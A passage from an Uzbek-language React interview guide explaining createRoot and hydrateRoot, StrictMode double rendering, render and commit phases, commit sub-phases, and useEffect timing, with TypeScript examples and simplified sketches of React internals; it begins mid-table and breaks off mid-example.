| Auto unmount | ❌ | `root.unmount()` |
| Multiple calls | Bir xil container'da OK | Bir marta — `root.render()` qayta-qayta |

### Kod misoli

```tsx
// 1. Standard React 19 entry point
import { createRoot } from "react-dom/client";
import { StrictMode } from "react";
import { App } from "./App";

const container = document.getElementById("root");
if (!container) throw new Error("Root container missing");

const root = createRoot(container);
root.render(
  <StrictMode>
    <App />
  </StrictMode>
);

// 2. Multiple roots (microfrontend, embedded widget)
const widgetContainer = document.getElementById("chat-widget");
const widgetRoot = createRoot(widgetContainer!);
widgetRoot.render(<ChatWidget />);

// Mainframe
const appContainer = document.getElementById("main-app");
const appRoot = createRoot(appContainer!);
appRoot.render(<App />);

// 3. Hydration (SSR'dan keyin)
import { hydrateRoot } from "react-dom/client";

const root = hydrateRoot(
  document.getElementById("root")!,
  <App />,
  {
    onRecoverableError: (error) => console.warn("Hydration mismatch:", error),
  }
);
```

<details>
<summary><strong>Deep Dive</strong></summary>

**Internal: `createRoot` nima qiladi:**

```typescript
// Soddalashtirilgan
function createRoot(container: Element) {
  const fiberRoot = createFiberRoot(container, {
    isConcurrent: true,
    hydrate: false,
  });

  return {
    render(element) {
      updateContainer(element, fiberRoot);
    },
    unmount() {
      updateContainer(null, fiberRoot);
    },
  };
}
```

`fiberRoot` — root Fiber bo'lib, `current` va `workInProgress` tree pointer'larini saqlaydi.

**Migration breaking changes (R17 → R18):**

1. **Automatic batching**:
```tsx
// R17 — ikki re-render
setTimeout(() => {
  setCount(1);
  setName("Ali");
}, 100);

// R18 — bitta re-render (automatic batching)
```

2. **Strict Mode 2x mount/effect**:
```tsx
useEffect(() => {
  console.log("mount");
  return () => console.log("cleanup");
}, []);

// R17: "mount" bir marta
// R18 dev StrictMode: "mount" → "cleanup" → "mount"
```

3. **Suspense behavior**: Render-only fallback (R17) → full SSR + selective hydration (R18).

**`hydrateRoot` vs `createRoot`:**
- `createRoot` — DOM bo'sh (CSR — client-side rendering)
- `hydrateRoot` — DOM allaqachon HTML bilan to'ldirilgan (SSR'dan), React faqat event listener'lar va state'ni "ulaydi"

**Ikkita bir xil container'ga `createRoot`:**
```tsx
const root1 = createRoot(container);
root1.render(<App1 />);

const root2 = createRoot(container); // ⚠️ warning: existing root
// ✅ to'g'ri: avval root1.unmount(), keyin root2 yaratish
```

**Render mode evolyutsiyasi:**
- **Legacy mode** (R16-R17): Sync only — `ReactDOM.render`
- **Blocking mode** (R18 deprecated proposal): Hybrid
- **Concurrent mode** (R18+): Default for `createRoot`, opt-in for features

`useTransition`, `useDeferredValue` — concurrent rendering'siz ishlamaydi (legacy'da ham bor lekin no-op).

</details>

### Edge Cases

- **`createRoot` chaqiruv joyi**: Faqat bir marta chaqiriladi (top-level). Re-render uchun `root.render()` chaqiriladi (lekin React state'ni o'zgartirish odatda kifoya).
- **Remount**: `root.unmount()` keyin yana `createRoot(container)` — yangi tree, eski state yo'qoladi.
- **Server-side**: `createRoot` faqat browser. Server'da `renderToString`/`renderToReadableStream` ishlatiladi.

### Follow-up savollar

- "Test'larda `createRoot` ishlatiladi-mi?" — `@testing-library/react` v13+ avtomatik `createRoot` ishlatadi. Manual'da React Testing Library API orqali (`render(<App />)`).
- "Why two `createRoot`/`hydrateRoot` API'lar?" — Mount source farqli: client-only va SSR ishlatish kontekstida sintaksis aniqroq, mismatch handling alohida.
- "TypeScript da `getElementById` null bo'lishi mumkin?" — Ha, `Element | null`. Production'da non-null assertion (`!`) yoki guard (`if (!container) throw`).

</details>

---

### 17. Strict Mode nima qiladi va nima uchun 2x render/effect? [Middle+]

<details>
<summary><strong>Javob</strong></summary>

### Qisqa javob

**`<StrictMode>`** — development-only komponent. R18+'dan boshlab har komponentni va effect'ni **2 marta** render/run qiladi (mount → unmount-cleanup → remount cycle). Maqsad: concurrent rendering invariantlarini tekshirish — render purity, effect cleanup-resilience, deprecated API ishlatishi.

### To'liq tushuntirish

**StrictMode aniqlash mumkin bo'lgan muammolar:**

1. **Render side effects** — `setState` render body'da, DOM mutation, fetch
2. **Effect cleanup yo'qligi** — mount-unmount-mount cycle'da resource leak
3. **Deprecated lifecycle methods** — `componentWillMount`, `componentWillReceiveProps`, `componentWillUpdate` (R16.3'dan `UNSAFE_` prefix bilan ishlash davom etadi, lekin warning beradi)
4. **Legacy string refs** (`ref="myInput"`) — modern React'da `useRef`/callback ref ishlatiladi
5. **Eski Context API** (`contextTypes`, `getChildContext`) — `createContext` bilan almashtirilgan
6. **`findDOMNode`** — deprecated, concurrent rendering bilan mos emas

**2x behavior (R18+):**

| Aspekt | Production | Strict Mode (dev) |
|--------|-----------|-------------------|
| Render | 1x | 2x |
| `useEffect` | mount → unmount | mount → cleanup → mount → unmount |
| `useLayoutEffect` | mount → unmount | mount → cleanup → mount → unmount |
| `useState` initializer | 1x | 2x |
| `useMemo` callback | 1x | 2x (development) |
| Event handlers | 1x | 1x (faqat render/effect 2x) |

**Production'da hech qachon 2x bo'lmaydi.**

### Kod misoli

```tsx
import { StrictMode } from "react";
import { createRoot } from "react-dom/client";

// ✅ Top-level StrictMode
const root = createRoot(document.getElementById("root")!);
root.render(
  <StrictMode>
    <App />
  </StrictMode>
);

// Subtree-level — qism tree'ga StrictMode (mavjud kodbase'ga bosqichma-bosqich qo'shish)
function App() {
  return (
    <div>
      <Header /> {/* StrictMode'siz */}
      <StrictMode>
        <NewFeature /> {/* faqat shu yerda 2x */}
      </StrictMode>
    </div>
  );
}
```

**StrictMode bilan qoqilib tushadigan kod:**

```tsx
// ❌ Render side effect
function Counter() {
  let count = 0;
  count += 1;  // ← side effect render body'da
  return <div>{count}</div>;
}
// StrictMode'da: 2x render, count noto'g'ri ko'rinadi

// ❌ Cleanup-siz effect
function FetchData() {
  const [data, setData] = useState(null);

  useEffect(() => {
    fetch("/api/data")
      .then((r) => r.json())
      .then(setData);
    // ❌ cleanup yo'q
  }, []);

  return <div>{data?.name}</div>;
}
// StrictMode'da: 2 ta fetch jo'natiladi, race condition mumkin

// ✅ To'g'ri: cleanup bilan
function FetchData() {
  const [data, setData] = useState(null);

  useEffect(() => {
    const controller = new AbortController();
    fetch("/api/data", { signal: controller.signal })
      .then((r) => r.json())
      .then(setData)
      .catch((e) => {
        if (e.name !== "AbortError") throw e;
      });

    return () => controller.abort();
  }, []);

  return <div>{data?.name}</div>;
}
```

<details>
<summary><strong>Deep Dive</strong></summary>

**Nima uchun 2x — concurrent rendering invariants:**

R18'dan boshlab React render'ni **interrupt qilishi va qayta boshlashi** mumkin (concurrent rendering). Demak:
- Render funksiya **deterministik** bo'lishi shart (purelangan)
- Side effect render body'da bo'lsa — qayta render'da ikki marta sodir bo'ladi
- Effect mount → unmount → mount cycle'ga chidamli bo'lishi shart (state lose qilmasligi)

**StrictMode 2x — bu invariantlarni dev-time'da tekshiradi.** Agar kod 2x'da to'g'ri ishlasa, concurrent'da ham to'g'ri ishlaydi.

**Aniq mexanizm (R18+):**

```typescript
// React internal (sodda)
function commitMount(fiber) {
  if (__DEV__ && isStrictModeFiber(fiber)) {
    // 1. Mount
    runEffect(fiber);
    // 2. Synthetic unmount
    runCleanup(fiber);
    // 3. Re-mount
    runEffect(fiber);
  } else {
    runEffect(fiber);
  }
}
```

**Effect cleanup-resilience invariant:**

Effect'ning cleanup function effect'ni **butun bekor qilishi** kerak. Resource (subscription, timer, listener) bo'lsa — cleanup uni release qiladi. Mount → cleanup → mount cycle'da hech qanday leak bo'lmasligi kerak.

```tsx
// ❌ Subscribe + cleanup yo'q
useEffect(() => {
  const unsubscribe = store.subscribe(handler);
  // cleanup yo'q ← 2x mount'da 2 ta listener
}, []);

// ✅ Cleanup-resilient
useEffect(() => {
  const unsubscribe = store.subscribe(handler);
  return unsubscribe; // ← har mount-unmount cycle'da to'g'ri release
}, []);
```

**`useState` initializer 2x sababi:**

```tsx
const [items, setItems] = useState(() => {
  console.log("initializing");  // ← StrictMode dev: 2 marta
  return expensiveCompute();
});
```

Initializer pure bo'lishi shart (bir xil natija qaytarishi). Agar side effect bo'lsa — 2x'da bug ko'rinadi.

**Production'da yo'q sababi:**

Strict Mode tekshirishlari **dev-time'da debugging uchun**. Production'da 2x performance overhead bo'ladi — dev'da o'rganib olib, prod'da olib tashlanadi.

**Suspense + StrictMode interaction:**

R19'gacha StrictMode + Suspense + lazy loading ba'zan duplicate suspends — fixed in R18.2+.

</details>

### Edge Cases

- **Console.log 2 marta**: Dev'da `console.log` har render'da 2x ko'rinadi — bu intentional. React 17'da bunday emas edi (developer'larni chalg'itadi, lekin kerak).
- **`useEffect` deps array bo'sh va effect ichida fetch**: `AbortController`'siz — race condition mumkin (1-mount fetch, cleanup, 2-mount fetch — eski response keladi).
- **`useRef` initialization**: `useRef(initialValue)` — `initialValue` har render'da hisoblanadi (literal). `useState(() => expensive())` kabi function initializer formati yo'q. Strict Mode 2x mount'da `ref.current` persist qiladi (mount cycle'lar orasida).
- **3rd party library StrictMode'siz**: Eski library'lar effect cleanup'siz yozilgan — StrictMode'da break bo'ladi. Issue ochish yoki vendor patch.

### Follow-up savollar

- "StrictMode disable qilish mumkinmi?" — `<StrictMode>` wrapper'ini olib tashlash. Lekin bu noto'g'ri code'ni yashirishdir — fix qilish yaxshiroq.
- "StrictMode test'larda ishlamasin?" — `@testing-library/react` v13+ default StrictMode ichida render qiladi. Disable qilish uchun custom render wrapper.
- "R17'da StrictMode nima qilardi?" — Faqat warning'lar (deprecated lifecycle, legacy refs). 2x effect R18'da qo'shildi.

</details>

---

### 18. Render Phase vs Commit Phase — bu ikkisi nima qiladi? [Middle]

<details>
<summary><strong>Javob</strong></summary>

### Qisqa javob

**Render Phase** — komponent function'larni chaqirish, Fiber tree quris, JSX'ni Element tree'ga aylantirish, oldingi tree bilan diff qilish. **Pure va interruptible**. **Commit Phase** — DOM mutation, ref attach/detach, effects ishga tushirish. **Sync va uninterruptible** — bir marta boshlangan, oxirigacha tugatadi.

### To'liq tushuntirish

**Pipeline:**

```
State update (setState chaqirildi)
        ↓
   Scheduler enqueue
        ↓
┌─────────────────────────────────┐
│  Render Phase (interruptible)   │
│  - workInProgress tree quriladi  │
│  - Komponent functions chaqiriladi │
│  - Reconciliation (diff)         │
│  - Pure — DOM tegmaydi           │
│  - Yield qila oladi              │
└─────────────────────────────────┘
        ↓ (commit'ga tayyor)
┌─────────────────────────────────┐
│  Commit Phase (sync)             │
│  1. Before Mutation              │
│  2. Mutation (DOM o'zgartirish)  │
│  3. Layout (sync effects)        │
└─────────────────────────────────┘
        ↓
   Browser paint
        ↓
   Passive effects (useEffect)
```

**Render Phase qoidalari:**

- ✅ Pure — bir xil props/state → bir xil JSX
- ✅ No side effects in render body
- ✅ No DOM mutation
- ✅ No `setState` outside event handler/effect
- ❌ Interrupt qilinishi mumkin → restart bo'ladi
- ❌ Render'da `console.log` — qayta-qayta chiqishi mumkin

**Commit Phase qoidalari:**

- ✅ DOM mutation faqat shu yerda
- ✅ Refs attach/detach
- ✅ Effects scheduled
- ❌ Sync — uzun sync work UI'ni bloklashi mumkin
- ❌ Interrupt qilib bo'lmaydi

### Kod misoli

```tsx
function Counter() {
  const [count, setCount] = useState(0);
  console.log("Render Phase");  // Pure deb hisoblanadi (lekin StrictMode'da 2x)

  useEffect(() => {
    console.log("Effect — Commit'dan keyin (passive)");
    return () => console.log("Cleanup");
  }, [count]);

  useLayoutEffect(() => {
    console.log("Layout Effect — Commit Layout sub-phase");
  }, [count]);

  return (
    <button onClick={() => setCount(count + 1)}>
      {count}
    </button>
  );
}

// Initial render output tartibi:
// 1. "Render Phase"
// 2. "Layout Effect — Commit Layout sub-phase"
// 3. (browser paint)
// 4. "Effect — Commit'dan keyin (passive)"

// click qilingach:
// 1. "Render Phase"
// 2. "Cleanup"
// 3. "Layout Effect — Commit Layout sub-phase"
// 4. (browser paint)
// 5. "Effect — Commit'dan keyin (passive)"
```

**Render Phase'da side effect — ANTI-PATTERN:**

```tsx
// ❌ render body'da side effect
function BadCounter({ id }: { id: string }) {
  const [count, setCount] = useState(0);

  // ❌ render'da fetch
  fetch(`/api/users/${id}`).then((r) => r.json()).then(setCount);

  // ❌ render'da DOM mutation
  document.title = `Count: ${count}`;

  // ❌ render'da setState (infinite loop)
  if (count < 5) setCount(count + 1);

  return <div>{count}</div>;
}

// ✅ effect'ga ko'chirish
function GoodCounter({ id }: { id: string }) {
  const [count, setCount] = useState(0);

  useEffect(() => {
    fetch(`/api/users/${id}`).then((r) => r.json()).then(setCount);
  }, [id]);

  useEffect(() => {
    document.title = `Count: ${count}`;
  }, [count]);

  return <div>{count}</div>;
}
```

<details>
<summary><strong>Deep Dive</strong></summary>

**Render Phase ichidagi qadamlar:**

1. **Begin work** — joriy fiber'dan boshlanadi
2. **Reconcile children** — komponent function chaqiriladi, JSX qaytadi
3. **Children processing** — har bola element uchun yangi/eski Fiber match (key + type)
4. **Update or create fibers** — match bo'lsa update path, bo'lmasa create
5. **Hooks rendering** — `memoizedState` linked list traverse, hooks dispatcher swap
6. **Yield check** — `shouldYield()` true bo'lsa → MessageChannel yield
7. **Resume** — `nextUnitOfWork`'dan davom

**Commit Phase 3 sub-phases (R18+):**

1. **Before Mutation** (eski "snapshot" phase):
   - `getSnapshotBeforeUpdate` (legacy class) — DOM read before mutation
   - Ref detachment preparation

2. **Mutation**:
   - DOM nodes added/removed/updated
   - Refs detached (eski ref'lar)
   - `componentWillUnmount` (class)

3. **Layout**:
   - Refs attached (yangi ref'lar)
   - `componentDidMount`/`componentDidUpdate` (class)
   - `useLayoutEffect` callback chaqiriladi (sync)

**Passive effects (Commit'dan keyin):**

- `useEffect` callback — async, browser paint'dan keyin
- Browser idle bo'lsa (microtask queue) chaqiriladi
- Render'ni bloklamaydi

**Render Phase abort mexanizmi:**

```typescript
// Soddalashtirilgan
function workLoop() {
  while (nextUnitOfWork && !shouldYield()) {
    nextUnitOfWork = performUnitOfWork(nextUnitOfWork);
  }

  if (!nextUnitOfWork) {
    // Render finished, ready for commit
    commitRoot();
  } else {
    // Yielded — schedule continuation
    scheduleCallback(workLoop);
  }
}

function shouldYield() {
  return performance.now() >= deadline; // 5ms slice
}
```

**High-priority interrupt:**

```typescript
// Low priority work (background data fetch)
const lowPriRoot = scheduleRender(WIPRoot, DefaultLane);

// User input keldi — high priority
const inputUpdate = scheduleRender(WIPRoot, SyncLane);
// ↑ low pri work tashlanadi (workInProgress yangilanadi), high pri'dan boshlanadi
```

**Why purity matters:**

Render phase abort va restart qilinishi mumkin. Side effect (counter increment, DOM mutation) — `count = 5` bo'lib qoladi, lekin render qayta boshlasa `count = 6` bo'ladi (noto'g'ri). Pure render — restart safe.

</details>

### Edge Cases

- **Render Phase'da setState (specific case)**: Component render body'da setState chaqirsa va u **conditional** bo'lsa (infinite loop'siz), React shu render'da update'ni qo'llaydi (re-render). Bu "render phase update" deb ataladi va anti-pattern (kerak bo'lsa, `useMemo` yoki `useEffect`'ga ko'chirish).
- **Stale state in event handler**: Event handler closure'i — render paytidagi state'ni tutadi. Tez-tez setState chaqirilsa, eski state value ishlatiladi (functional update — `setX(prev => prev + 1)` yechim).
- **`useLayoutEffect` SSR'da**: Server'da `useLayoutEffect` ishlamaydi (warning) — DOM yo'q. Pattern: `useEffect` o'rniga ishlatish yoki `typeof window` check.

### Follow-up savollar

- "Reconciliation Render Phase'da-mi?" — Ha, `workInProgress` tree quris paytda. Diff algoritmi shu yerda ishlaydi.
- "Re-render hech narsani render qilmasa?" — Bailout: `Object.is` bilan props/state taqqoslab bir xil bo'lsa, child re-render'lar skip. Lekin parent render qilingan (function chaqirilgan).
- "Effect Commit'dan oldin chaqirilishi mumkinmi?" — `useLayoutEffect` Layout sub-phase'da (sync, paint'dan oldin). `useInsertionEffect` undan ham oldin (CSS-in-JS uchun).

</details>

---

### 19. Commit Phase 3 sub-phase — Before Mutation, Mutation, Layout [Senior]

<details>
<summary><strong>Javob</strong></summary>

### Qisqa javob

Commit Phase **3 sub-phase**'dan tashkil topgan: (1) **Before Mutation** — `getSnapshotBeforeUpdate` (legacy class) DOM mutation'dan oldin scroll position kabi qiymatlarni o'qish, (2) **Mutation** — DOM o'zgartirish (insert/remove/update), ref'lar detach, `componentWillUnmount`, (3) **Layout** — yangi ref'lar attach, `componentDidMount/Update`, `useLayoutEffect` sync chaqiriladi. Hammasi sync — paint'dan oldin.

### To'liq tushuntirish

**Detailed pipeline:**

```
Render Phase tugadi → workInProgress tree tayyor
                           ↓
            ┌──────────────────────────┐
            │  COMMIT PHASE (sync)     │
            │                          │
            │  ┌────────────────────┐  │
            │  │ 1. BEFORE MUTATION │  │
            │  │ - getSnapshotBefore│  │
            │  │   Update (class)   │  │
            │  │ - Read DOM (scroll │  │
            │  │   position)        │  │
            │  └────────────────────┘  │
            │           ↓              │
            │  ┌────────────────────┐  │
            │  │ 2. MUTATION        │  │
            │  │ - Old refs detach  │  │
            │  │ - DOM operations   │  │
            │  │   (insert/remove/  │  │
            │  │    update)         │  │
            │  │ - componentWillUn  │  │
            │  │   mount (class)    │  │
            │  └────────────────────┘  │
            │           ↓              │
            │  current = workInProgress│
            │           ↓              │
            │  ┌────────────────────┐  │
            │  │ 3. LAYOUT          │  │
            │  │ - New refs attach  │  │
            │  │ - componentDidMount│  │
            │  │   /Update (class)  │  │
            │  │ - useLayoutEffect  │  │
            │  │   (sync)           │  │
            │  └────────────────────┘  │
            └──────────────────────────┘
                           ↓
                   Browser paint
                           ↓
                Passive effects
                (useEffect — async)
```

**Har sub-phase nima qila oladi:**

| Sub-phase | DOM read | DOM write | Effect | Ref |
|-----------|----------|-----------|--------|-----|
| Before Mutation | ✅ ha | ❌ | ❌ | ❌ |
| Mutation | ⚠️ avoid | ✅ ha | ❌ | detach |
| Layout | ✅ ha (post-mutation) | ⚠️ avoid (reflow) | sync | attach |

### Kod misoli

```tsx
function ScrollPreserver({ children }: { children: React.ReactNode }) {
  const containerRef = useRef<HTMLDivElement>(null);
  const scrollPositionRef = useRef<number>(0);

  // Layout effect — Layout sub-phase'da chaqiriladi (sync)
  useLayoutEffect(() => {
    // Mutation tugadi, yangi DOM bor
    // Eski scroll position'ni qaytarish — visual flicker'ni oldini olish
    if (containerRef.current && scrollPositionRef.current > 0) {
      containerRef.current.scrollTop = scrollPositionRef.current;
    }

    return () => {
      // Cleanup — keyingi mutation oldi
      if (containerRef.current) {
        scrollPositionRef.current = containerRef.current.scrollTop;
      }
    };
  });

  return (
    <div ref={containerRef} style={{ overflow: "auto", height: 400 }}>
      {children}
    </div>
  );
}
```

**Class lifecycle mapping:**

```tsx
class ScrollList extends React.Component {
  // Before Mutation sub-phase
  getSnapshotBeforeUpdate(prevProps, prevState) {
    // DOM mutation'dan oldin — masalan eski scroll pozitsiyasi
    if (this.props.items.length > prevProps.items.length) {
      const list = this.listRef.current;
      return list.scrollHeight - list.scrollTop;
    }
    return null;
  }

  // Layout sub-phase (mutation'dan keyin)
  componentDidUpdate(prevProps, prevState, snapshot) {
    if (snapshot !== null) {
      const list = this.listRef.current;
      list.scrollTop = list.scrollHeight - snapshot;
    }
  }

  render() {
    return <ul ref={this.listRef}>{...}</ul>;
  }
}
```

<details>
<summary><strong>Deep Dive</strong></summary>

**Internal commit pipeline (React source soddalashtirilgan):**

```typescript
function commitRoot(root) {
  // Phase 1: Before Mutation
  commitBeforeMutationEffects(root.finishedWork);

  // Phase 2: Mutation
  commitMutationEffects(root, finishedWork);

  // Switch trees (current points to new fiber tree)
  root.current = finishedWork;

  // Phase 3: Layout
  commitLayoutEffects(finishedWork, root);

  // Schedule passive effects (useEffect — async)
  if (rootDoesHavePassiveEffects) {
    scheduleCallback(NormalPriority, flushPassiveEffects);
  }
}
```

**Effect flags (Fiber `flags` bitmask):**

```typescript
const enum Flags {
  Placement       = 0b0000000010,  // insert
  Update          = 0b0000000100,  // mutate
  Deletion        = 0b0000001000,  // remove
  Snapshot        = 0b0000010000,  // before mutation
  Passive         = 0b0000100000,  // useEffect
  Layout          = 0b0001000000,  // useLayoutEffect, didMount/Update
  Ref             = 0b0010000000,  // ref attach/detach
}
```

Har sub-phase faqat tegishli flag'larni traverse qiladi (subtreeFlags bilan tez skip).

**Why split into 3 sub-phases:**

1. **Before Mutation** — eski DOM holatini saqlash imkoniyati (scroll, focus, video time) — keyingi sub-phase'da DOM o'zgaradi, lekin oldingi value kerak bo'lishi mumkin (UX preservation).

2. **Mutation** — barcha DOM mutations atomic. Refs detach: yangi DOM yo'q hali, lekin eski ref'lar to'g'ri "olib tashlanadi". `componentWillUnmount` shu yerda — eski instance ma'lumotlar mavjud.

3. **Layout** — barcha mutation tugagandan keyin, sync API'lar uchun. `componentDidMount` va `useLayoutEffect` DOM measurement qilishi mumkin (yangi DOM ko'rinadi). Browser paint'dan oldin — synchronous DOM update layout shift'siz qo'shiladi.

**Browser paint vs Layout sub-phase:**

```
Mutation → Layout sub-phase → ... → JS task tugaydi → Browser paint
                                                      ↓
                                              Passive effects
```

Layout sub-phase ichida DOM read qilsa — sync layout (browser layout calculation). Bu "force reflow" deb ataladi va sekin operatsiya. Shuning uchun `useLayoutEffect` ichida DOM mutation'dan saqlanish kerak — yangi cycle of layout boshlanadi.

**Passive effects timing:**

Browser paint'dan keyin React `flushPassiveEffects` chaqiradi:
1. Cleanup'lar avval (eski cycle)
2. Effect'lar keyin (yangi cycle)
3. Child effects parent'dan oldin (depth-first traversal)

**Real-world: ScrollPreserver pattern:**

R19'da `<ViewTransition>` API + browser View Transitions integration — Layout phase'da DOM swap, browser smooth transition qiladi.

**Commit phase NEVER interruptible:**

Concurrent rendering faqat Render Phase'da. Commit boshlangach — sync to oxirgacha. Sabab: tearing prevention (yarim-mutated DOM ko'rinmasligi kerak).

</details>

### Edge Cases

- **`useLayoutEffect` ichida setState**: Sync re-render trigger qiladi (yana commit cycle). Browser paint'dan oldin yana mutation. Performance: avoid agar mumkin bo'lsa.
- **Mutation phase'da DOM read** (`offsetHeight`): Force layout — ba'zi mutation hali tugamagan, ammo old layout invalidate qilingan. Bug-prone.
- **Ref attach order**: Child refs avval, parent refs keyin (depth-first). Parent didMount'da child ref allaqachon attached.
- **`useInsertionEffect`**: R18+ — Layout sub-phase'dan ham oldin chaqiriladi, CSS-in-JS library'lar uchun (style injection layout'dan oldin).

### Follow-up savollar

- "Mutation sub-phase'da componentWillUnmount nima uchun?" — Eski instance state hali mavjud (mutation tugamadi). Class instance unmount cleanup'ni shu yerda qiladi (subscription cancel, timer clear).
- "Refs detach Mutation'da, attach Layout'da — nima uchun ajratilgan?" — Ikki tree o'rtasida refs'larni transfer qilish: eski elementlar hali DOM'da bo'lganda detach (ref ko'rsatishi mumkin), yangi elementlar DOM'ga qo'shilgandan keyin attach.
- "Suspense fallback Commit'da nima qiladi?" — Suspended subtree placeholder bilan replace qilinadi (Mutation), `<Suspense>` fallback DOM'ga insert. Promise resolve bo'lganda yangi commit cycle.

</details>

---

### 20. `useEffect` timing — passive effects qachon chaqiriladi? [Middle+]

<details>
<summary><strong>Javob</strong></summary>

### Qisqa javob

`useEffect` callback **passive effect** — Commit Phase tugagandan **va browser paint'dan keyin** async chaqiriladi. Maqsad: render bloklamaslik, browser paint kechikishini oldini olish. Render → Commit → Paint → useEffect (async). `useLayoutEffect` esa sync — Layout sub-phase'da paint'dan oldin.

### To'liq tushuntirish

**Timing comparison:**

| Hook | Timing | Sync/Async | Bloklaydi-mi? |
|------|--------|------------|---------------|
| `useInsertionEffect` | Layout phase'dan oldin | Sync | Paint'ni bloklaydi |
| `useLayoutEffect` | Layout sub-phase | Sync | Paint'ni bloklaydi |
| `useEffect` | Browser paint'dan keyin | Async | Bloklamaydi |
| `componentDidMount/Update` | Layout sub-phase | Sync | `useLayoutEffect`ga teng |

### Kod misoli

```tsx
function TimingDemo() {
  console.log("1. Render Phase");

  useInsertionEffect(() => {
    console.log("2. Insertion Effect (CSS-in-JS injection)");
  }, []);

  useLayoutEffect(() => {
    console.log("3. Layout Effect (sync, paint'dan oldin)");
    // DOM measurement OK — yangi DOM bor
    return () => console.log("3-cleanup. Layout Cleanup");
  }, []);

  useEffect(() => {
    console.log("4. Effect (async, paint'dan keyin)");
    return () => console.log("4-cleanup. Passive Cleanup");
  }, []);

  return <div>Demo</div>;
}

// Initial mount output:
// 1. Render Phase
// 2. Insertion Effect (CSS-in-JS injection)
// 3. Layout Effect (sync, paint'dan oldin)
// (browser paint sodir bo'ladi)
// 4. Effect (async, paint'dan keyin)
```

**Use case farqi:**

```tsx
// useEffect — async, paint'ni bloklamaydi
useEffect(() => {
  fetch("/api/data").then((r) => r.json()).then(setData);
}, []);

// useLayoutEffect — sync, DOM measurement
useLayoutEffect(() => {
  const rect = elementRef.current?.getBoundingClientRect();
  if (rect && rect.right > window.innerWidth) {
    setPosition(window.innerWidth - rect.width);  // visual flicker'siz
  }
}, [content]);

// useInsertionEffect — CSS injection (library only)
useInsertionEffect(() => {
  const style = document.createElement("style");
  style.textContent = `.cls-${id} { color: red }`;
  document.head.appendChild(style);
  return () => document.head.removeChild(style);
}, [id]);
```

<details>
<summary><strong>Deep Dive</strong></summary>

**Passive effect scheduling:**

```typescript
// React internal (sodda)
function commitRoot(root) {
  commitBeforeMutationEffects(root);
  commitMutationEffects(root);
  commitLayoutEffects(root);  // ← useLayoutEffect SHU YERDA chaqiriladi (sync)

  // Passive effects schedule qilinadi (async)
  if (rootHasPassiveEffects(root)) {
    schedulePassiveEffectCallback();  // ← MessageChannel orqali
  }
}

function flushPassiveEffects() {
  // Browser paint allaqachon sodir bo'lgan
  // Cleanup avval
  commitPassiveUnmountEffects(root);
  // Yangi effect'lar keyin
  commitPassiveMountEffects(root);
}
```

**MessageChannel scheduling:**

```typescript
const channel = new MessageChannel();
channel.port2.onmessage = () => {
  flushPassiveEffects();
};

// Schedule
channel.port1.postMessage(null);
// → Browser idle bo'lganda (microtask queue) chaqiriladi
```

**Nima uchun MessageChannel:**
- `setTimeout(0)` — minimum 4ms delay (HTML spec)
- `requestIdleCallback` — Safari'da yo'q, har xil browser support
- `MessageChannel` — universal, fast, post-paint trigger

**Effect order:**

1. **Mount cycle** (initial render):
   - Layout effects: child → parent (depth-first)
   - Passive effects: child → parent

2. **Update cycle**:
   - Layout cleanups (eski) → Layout effects (yangi)
   - Passive cleanups (eski) → Passive effects (yangi)
   - Cleanup'lar avval, effect'lar keyin

3. **Unmount cycle**:
   - Faqat cleanup'lar (no new effects)

**Concurrent rendering bilan effect:**

R18+ concurrent mode'da:
- Render abort qilinishi mumkin → effect chaqirilmaydi (commit bo'lmadi)
- Commit faqat success'da bo'ladi → effect doim consistent state bilan
- Strict Mode 2x — effect mount → cleanup → mount cycle (idempotent talab)

**Browser paint vs effect race:**

```typescript
// Paint occurs when:
// 1. JS task tugaydi
// 2. Browser idle bo'ladi
// 3. requestAnimationFrame callback'lar bajariladi
// 4. Style/Layout/Paint pipeline ishlaydi

// useEffect MessageChannel'da scheduled:
// - Microtask queue (fast)
// - Tipik 5-50ms paint'dan keyin
```

**`useEffect` performance pattern:**

```tsx
// Past performance: render bo'lganda har gal subscribe
useEffect(() => {
  const ws = new WebSocket(url);
  ws.onmessage = (e) => setData(JSON.parse(e.data));
  return () => ws.close();
}, [url]);

// Lekin har URL change'da connection cycle — kerak. Stale closure issue:
useEffect(() => {
  const id = setInterval(() => {
    setCount(c => c + 1);  // ← functional update — stale state oldini oladi
  }, 1000);
  return () => clearInterval(id);
}, []);  // bo'sh deps OK, functional update bilan
```

</details>

### Edge Cases

- **`useEffect` ichida `setState` (synchronous)**: Yangi render cycle trigger — render → commit → effect → ... potentially infinite. Conditional `setState` bilan terminate qilish kerak.
- **`useLayoutEffect` SSR'da**: Server'da DOM yo'q — warning. `useEffect` ishlatish yoki `typeof window !== "undefined"` check.
- **Order of multiple effects**: Bir komponentda 2 ta `useEffect` — declaration order'da chaqiriladi. Cleanup ham declaration order (lekin reverse'da emas, intuitive bo'lmasligi mumkin).
- **`useEffect` race condition**: Bir nechta async effect parallel chaqirilsa — eski response yangi'dan keyin kelishi mumkin. `AbortController` yoki cancel flag bilan handle qilish.

### Follow-up savollar

- "`useEffect` har render'da chaqiriladi-mi?" — Deps array bo'lmasa — ha. Bo'sh deps `[]` — faqat mount/unmount. Deps bo'lsa — deps reference o'zgarganda.
- "Cleanup qachon chaqiriladi?" — (1) keyingi render effect'idan oldin (yangi cycle), (2) komponent unmount'da, (3) StrictMode dev'da synthetic unmount.
- "Effect'da DOM mutation OK-mi?" — Mutation `useEffect`'da to'g'ri (paint'dan keyin), lekin `useLayoutEffect`'da yaxshiroq (visual flicker yo'q). Best: declarative React props orqali.

</details>

---

### 21. Initial render vs Re-render — ichki farq nima? [Middle]

<details>
<summary><strong>Javob</strong></summary>

### Qisqa javob

**Initial render** — birinchi mount: Fiber tree yaratiladi, hooks yaratiladi (`memoizedState` linked list quriladi), DOM yaratiladi va attach qilinadi, `componentDidMount`/`useEffect` mount cycle. **Re-render** — keyingi render: yangi `workInProgress` tree quriladi, eski tree bilan diff qilinadi, faqat o'zgargan node'lar update qilinadi, hooks `memoizedState` update path'idan o'tadi.

### To'liq tushuntirish

| Aspekt | Initial Render (Mount) | Re-render (Update) |
|--------|------------------------|---------------------|
| Fiber tree | Yaratiladi (current = null → workInProgress) | Mavjud (alternate swap) |
| Hooks | `mountState`, `mountEffect`, ... — yaratish | `updateState`, `updateEffect`, ... — update |
| DOM | `createElement` + `appendChild` | `setAttribute`, `nodeValue` (update) |
| Refs | `attach` (Layout phase) | `detach` old → `attach` new (agar o'zgargan) |
| Effects | Mount effects | Cleanup → effects |
| componentDid* | `componentDidMount` | `componentDidUpdate` |
| Diff | Yo'q (nothing to compare) | Old vs new tree |

### Kod misoli

```tsx
function Counter() {
